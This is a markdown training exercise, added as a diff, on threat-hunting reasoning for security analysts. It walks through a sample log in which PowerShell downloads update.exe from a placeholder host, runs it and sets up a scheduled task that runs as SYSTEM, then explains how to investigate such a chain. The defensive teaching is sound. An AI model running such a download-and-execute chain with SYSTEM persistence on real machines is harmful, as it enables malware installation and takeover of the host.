@@ -1,0 +1,172 @@
+# Week 8 — Saturday: Threat Hunting Analyst Reasoning
+
+## Objective
+
+Practice turning individual security events into a meaningful threat assessment by analyzing the full behavioral sequence rather than evaluating each event independently.
+
+---
+
+## Scenario
+
+The following activity was observed:
+
+```text
+10:02:14 AM — User logs in
+
+10:03:01 AM — powershell.exe starts
+
+10:03:04 AM — PowerShell runs:
+             Invoke-WebRequest https://example.com/update.exe
+
+10:03:06 AM — update.exe created in C:\Users\Public\
+
+10:03:08 AM — update.exe executes
+
+10:03:15 AM — New scheduled task created
+
+10:03:17 AM — Scheduled task runs as SYSTEM
+```
+
+---
+
+## Initial Assessment
+
+### Classification
+
+**Malicious / Highly Suspicious**
+
+### Reasoning
+
+Although the activity begins with a legitimate-looking user login and PowerShell execution, the complete sequence contains multiple indicators of potentially malicious behavior.
+
+The observed chain is:
+
+```text
+PowerShell
+    ↓
+Downloads executable
+    ↓
+Executable created
+    ↓
+Executable executes
+    ↓
+Scheduled task created
+    ↓
+Task executes as SYSTEM
+```
+
+The combination of **payload download, execution, and SYSTEM-level scheduled-task persistence** significantly increases the likelihood of malicious activity.
+
+A successful user login does not make all subsequent activity legitimate.
+
+---
+
+## 🔬 Evidence to Investigate Next
+
+The next phase of the investigation would focus on identifying exactly what was downloaded, executed, and persisted.
+
+### Downloaded Executable
+
+Investigate:
+
+* Filename
+* File path
+* SHA-256 hash
+* Digital signature
+* File creation time
+* Parent process
+* File reputation
+
+### Scheduled Task
+
+Investigate:
+
+* Task name
+* Creation time
+* Trigger
+* Action/command
+* Run-as account
+* Task executable/script
+* Whether the task remains persistent
+
+### PowerShell
+
+Investigate:
+
+* Event ID 4104
+* Complete script block
+* Full destination URL
+* Command-line arguments
+* Execution context
+
+### Network Activity
+
+Investigate:
+
+* Destination domain
+* Destination IP
+* DNS activity
+* Connection timestamps
+* Reputation of the remote host
+
+---
+
+## Analyst Lesson
+
+Individual events can appear harmless when viewed independently.
+
+For example:
+
+```text
+User Login → Normal
+PowerShell → Potentially Normal
+Web Request → Potentially Normal
+Scheduled Task → Potentially Normal
+SYSTEM Account → Potentially Normal
+```
+
+However, when correlated into a sequence:
+
+```text
+PowerShell
+→ Downloads Executable
+→ Executes Payload
+→ Creates Persistence
+→ Runs as SYSTEM
+```
+
+the overall behavior becomes highly suspicious.
+
+### Key Principle
+
+> **Indicator ≠ Incident**
+
+A single indicator rarely provides enough evidence by itself. Correlating multiple events and understanding their sequence provides a much stronger basis for determining whether activity is malicious.
+
+---
+
+## Lessons Learned
+
+1. Successful user authentication does not automatically make subsequent activity legitimate.
+
+2. PowerShell execution alone is not necessarily malicious.
+
+3. `Invoke-WebRequest` can be legitimate, but downloading and executing an unknown executable requires investigation.
+
+4. Scheduled tasks can be legitimate administrative mechanisms or persistence mechanisms depending on context.
+
+5. SYSTEM-level execution combined with newly created persistence is a significant escalation indicator.
+
+6. Threat hunters should evaluate **behavioral chains**, not isolated events.
+
+7. When evidence is incomplete, the correct response may be to escalate the investigation rather than immediately declaring an incident confirmed.
+
+---
+
+## Final Takeaway
+
+The most important skill practiced in this exercise was **correlation**.
+
+A SOC analyst's job is not simply to identify suspicious commands or events. The analyst must determine how those events relate to one another and whether the combined behavior is consistent with legitimate activity.
+
+**Correlation turns isolated logs into a meaningful threat investigation.**
